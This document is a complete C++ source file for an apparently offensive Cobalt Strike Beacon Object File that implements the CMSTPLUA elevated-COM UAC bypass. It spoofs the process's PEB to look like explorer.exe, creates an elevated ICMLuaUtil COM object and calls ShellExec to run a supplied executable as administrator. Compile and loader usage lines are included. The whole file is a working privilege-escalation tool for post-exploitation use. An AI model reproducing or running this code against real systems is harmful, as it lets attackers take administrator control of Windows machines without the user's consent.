// x86_64-w64-mingw32-g++ -c CmstpElevatedCOMBOF.cpp -w -o /share/test.o
// Usage: .\COFFLoader64.exe go .\test.o 2f0000002b000000433a5c55736572735c72616e64795c4465736b746f705c746573745c6d657373616765626f782e65786500
#include <windows.h>
#include <stdio.h>
#include <shobjidl.h>
#include <objbase.h>
#include <strsafe.h>
#include "ntos.h"

extern "C" {

#include "beacon.h"

    void go(char * args, unsigned long length);

    // Added for CmstpElevatedCOM UAC Bypass
    DECLSPEC_IMPORT     WINBASEAPI char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
    DECLSPEC_IMPORT     WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
    DECLSPEC_IMPORT     WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlAcquirePebLock(VOID);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlReleasePebLock(VOID);
    DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source);
    DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source);
    DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$LdrEnumerateLoadedModules(BOOLEAN ReservedFlag, PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION EnumProc, PVOID Context);
    DECLSPEC_IMPORT     WINBASEAPI int WINAPI OLE32$StringFromGUID2(REFGUID rguid, LPOLESTR lpsz, int cchMax);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$IIDFromString(LPCOLESTR lpsz, LPIID lpiid);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI KERNEL32$StringCchPrintfW(LPWSTR pszDest,size_t cchDest,LPCWSTR pszFormat,...);
    DECLSPEC_IMPORT     WINBASEAPI INT WINAPI KERNEL32$RtlZeroMemory(void *data, size_t size);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoGetObject(wchar_t*, BIND_OPTS*, REFIID, void** ppv);
    DECLSPEC_IMPORT     WINBASEAPI int __cdecl MSVCRT$swprintf(wchar_t *__stream, const wchar_t *__format, ...);
    DECLSPEC_IMPORT     WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);

}

#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE *QueryInterface)(
            __RPC__in ICMLuaUtil * This,
            __RPC__in REFIID riid,
            _COM_Outptr_  void **ppvObject);

    ULONG(STDMETHODCALLTYPE *AddRef)(
        __RPC__in ICMLuaUtil * This);

    ULONG(STDMETHODCALLTYPE *Release)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method1)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method2)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method3)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method4)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method5)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method6)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *ShellExec)(
        __RPC__in ICMLuaUtil * This,
        _In_     LPCWSTR lpFile,
        _In_opt_  LPCTSTR lpParameters,
        _In_opt_  LPCTSTR lpDirectory,
        _In_      ULONG fMask,
        _In_      ULONG nShow
        );

    HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
        __RPC__in ICMLuaUtil * This,
        _In_      HKEY hKey,
        _In_opt_  LPCTSTR lpSubKey,
        _In_opt_  LPCTSTR lpValueName,
        _In_      LPCTSTR lpValueString
        );

    HRESULT(STDMETHODCALLTYPE *Method9)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method10)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method11)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method12)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method13)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method14)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method15)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method16)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method17)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method18)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method19)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method20)(
        __RPC__in ICMLuaUtil * This);

    END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};

HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
    BIND_OPTS3 bo;
    WCHAR wszCLSID[MAX_PATH] = { 0 };
    WCHAR wszMonikerName[MAX_PATH] = { 0 };
    HRESULT hr = 0;

    OLE32$CoInitialize(NULL);

    OLE32$StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
    //hr = StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
    //MSVCRT$swprintf(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
    MSVCRT$swprintf(wszMonikerName, L"Elevation:Administrator!new:%s", wszCLSID);

    KERNEL32$RtlZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hWnd;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    hr = OLE32$CoGetObject(wszMonikerName, &bo, riid, ppVoid);
    return hr;
}

PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

// enumerate modules callback handler
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    //PPEB Peb = NtCurrentPeb();
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        NTDLL$RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        NTDLL$RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

// Spoof PEB for elevated COM access
// Credit: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass/blob/main/ColorDataProxyUACBypass/ColorDataProxyUACBypass.cpp
int SpoofExplorer() {
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    ICMLuaUtil* CMLuaUtil = NULL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    //PPEB Peb = NtCurrentPeb();
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    BIND_OPTS3 bop;
    NTDLL$RtlAcquirePebLock();
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        MSVCRT$wcscpy(ImageFileName, L"c:\\Windows\\");
        MSVCRT$wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        MSVCRT$wcscpy(CommandLine, L"explorer.exe");
    }
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    NTDLL$LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    NTDLL$RtlReleasePebLock();
    return 0;
}

void go(char * args, unsigned long length)
{
    // get args
    datap parser;
    char *fileToRun = NULL;
    BeaconDataParse(&parser, args, length);
    fileToRun = BeaconDataExtract(&parser, NULL);

    // convert supplied exe to wchar_t pointer
    char targetEXE[MAX_PATH] = {0};
    MSVCRT$strcpy(targetEXE, fileToRun);
    wchar_t* lpwszExecutable =  (wchar_t*)MSVCRT$malloc(MAX_PATH);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, targetEXE, -1, lpwszExecutable, MAX_PATH);

    // Spoof explorer.exe
    SpoofExplorer();
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully spoofed PEB for explorer.exe\n");

    HRESULT hr = 0;
    CLSID clsidICMLuaUtil = { 0 };
    IID iidICMLuaUtil = { 0 };
    ICMLuaUtil *CMLuaUtil = NULL;
    BOOL bRet = FALSE;
    
    do {
        OLE32$CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
        OLE32$IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

        // elevate to administrator
        hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
        if (FAILED(hr))
        {
            break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created elevated CMLuaUtil COM object\n");

        // execute supplied exe via elevated COM
        BeaconPrintf(CALLBACK_OUTPUT, "Calling ShellExec method from the elevated CMLuaUtil COM object...\n");
        hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
        if (FAILED(hr))
        {
            break;
        }

        bRet = TRUE;
    } while (FALSE);

    // free allocated memory
    MSVCRT$free(lpwszExecutable);

    // release handle to COM object
    if (CMLuaUtil)
    {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (bRet == TRUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "ShellExec executed successfully!\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "ShellExec failed!\n");
    }
    
    return;
}